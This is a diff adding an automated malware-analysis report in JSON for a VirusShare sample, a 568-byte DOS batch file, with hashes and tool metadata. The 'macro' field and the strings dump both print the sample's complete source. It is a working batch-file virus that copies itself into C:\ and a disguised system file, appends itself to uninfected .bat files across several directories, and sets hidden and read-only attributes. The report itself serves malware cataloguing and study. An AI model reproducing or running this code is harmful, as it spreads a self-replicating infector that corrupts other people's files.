@@ -1,0 +1,51 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros",
+            "command": "May run PowerShell commands",
+            "system": "May run an executable file or a system command on a Mac",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "@echo off\nif %2==aaa2_inf goto aaa2_inf\nif not exist c:\\aaa2.bat copy aaa2.bat c:\\ >nul\nif not exist c:\\windows\\system\\qsdf.sys type c:\\aaa2.bat > c:\\windows\\system\\qsdf.sys\nif not exist c:\\aaa2.bat type c:\\windows\\system\\qsdf.sys > c:\\aaa2.bat\nif not exist c:\\aaa2.bat copy %0.bat c:\\aaa2.bat >nul\nfor %%a in (..\\*.bat *.bat c:\\*.bat c:\\windows\\*.bat c:\\windows\\command\\*.bat e:\\*.bat) do call C:\\aaa2.bat %%a aaa2_inf\ngoto fin\n:aaa2_inf\nfind \"aaa2\"<%1>nul\nif not errorlevel 1 goto fin\n\ntype c:\\aaa2.bat>>%1\nattrib %1 +r\n:fin\nattrib c:\\aaa2.bat +h +r"
+    },
+    "filename": "VirusShare_3f97a6f03af2ca5f1679c2e77ae96683",
+    "filesize": 568,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3f97a6f03af2ca5f1679c2e77ae96683",
+        "sha1": "7d133e744d9b45123b2215b4393989d9fe5a3f0f",
+        "sha256": "beb0fe5ae6080a861de7fd87c2349e863c81e92c2a948927ba677f5e8f0ebffd"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "if %2==aaa2_inf goto aaa2_inf",
+            "if not exist c:\\aaa2.bat copy aaa2.bat c:\\ >nul",
+            "if not exist c:\\windows\\system\\qsdf.sys type c:\\aaa2.bat > c:\\windows\\system\\qsdf.sys",
+            "if not exist c:\\aaa2.bat type c:\\windows\\system\\qsdf.sys > c:\\aaa2.bat",
+            "if not exist c:\\aaa2.bat copy %0.bat c:\\aaa2.bat >nul",
+            "for %%a in (..\\*.bat *.bat c:\\*.bat c:\\windows\\*.bat c:\\windows\\command\\*.bat e:\\*.bat) do call C:\\aaa2.bat %%a aaa2_inf",
+            "goto fin",
+            ":aaa2_inf",
+            "find \"aaa2\"<%1>nul",
+            "if not errorlevel 1 goto fin",
+            "type c:\\aaa2.bat>>%1",
+            "attrib %1 +r",
+            ":fin",
+            "attrib c:\\aaa2.bat +h +r"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.311592",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
